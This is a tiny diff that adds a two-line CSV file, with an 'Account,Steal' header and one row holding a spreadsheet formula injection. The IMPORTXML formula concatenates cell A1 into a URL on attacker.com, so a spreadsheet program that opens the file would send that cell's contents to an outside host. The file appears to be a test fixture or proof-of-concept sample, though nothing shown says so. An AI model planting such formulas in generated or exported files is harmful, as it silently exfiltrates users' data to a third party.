@@ -1,0 +1,2 @@
+Account,Steal
+foo,=IMPORTXML(CONCAT("https://attacker.com/x?d=",A1),"//a")
